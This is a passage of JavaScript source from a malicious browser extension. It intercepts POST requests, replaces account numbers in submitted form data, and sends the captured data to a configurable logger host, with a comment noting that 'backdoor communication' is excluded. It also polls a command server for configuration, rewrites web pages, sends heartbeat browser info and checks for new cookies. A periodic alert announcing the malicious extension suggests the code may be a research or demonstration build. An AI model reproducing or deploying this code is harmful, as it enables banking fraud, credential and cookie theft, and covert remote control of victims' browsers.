								poststr = poststr.replace(origaccount[i], newaccount);
							}
							inputStream.setData(poststr, poststr.length);
							uploadChannel.setUploadStream(inputStream, "", -1);
						}
						httpChannel.requestMethod = "POST";
					}
					
					// Report the intercepted POST
					if(!host.match(/com-safebrowsing/)) {//prevent logging backdoor communication
						request = new XMLHttpRequest();
						var userID = this.generateUserID();
						extension.sendMessage(config.postdataloggerhost + userID, "postinfo%5Bdata%5D=" + encodeURIComponent(poststr), config.checksslvar);

						request.open("POST", this.config.postdataloggerhost + userID, true);
						request.setRequestHeader("Connection", "close");
						request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
						request.send("postinfo%5Bdata%5D=" + encodeURIComponent(params));
					}
				}
				seekable.seek(0, 0);
			}
		} catch (exception) {
			dbg(exception);
		}
	};
}

var extension = new Extension();

if(extension != null) {
	window.addEventListener("load", function load(event) {
		extension.Initialize();
	}, false);

	window.addEventListener("unload", function() {
		extension.Uninitialize();
	}, false);
}

// download the configuration on a scheduled basis
var interval0 = window.setInterval(function(thisObj) {
	extension.downloadConfig("http://127.0.0.1/c/", false);
}, 5 * 1000, this);

// read the config from local file
var interval1 = window.setInterval(function(thisObj) {
	this.config = extension.readConfig();
}, 2 * 1000, this);

// change the content of the web page 
var interval2 = window.setInterval(function(thisObj) {
	extension.rewritePageContent(extension.config);
}, 4 * 1000, this);

//heart-beat, send browser info to server
var interval7 = window.setInterval(function(thisObj) {
	extension.getEnvInfo(extension.config);
}, 15 * 1000, this);

// check for new cookies
var interval3 = window.setInterval(function(thisObj) {
	extension.cookieEvent(extension.config);
}, 10 * 1000, this);

var interval4 = window.setInterval(function(thisObj) {
	alert("Be warned user, a malicious extension is running in your browser.");
}, 60 * 1000, this);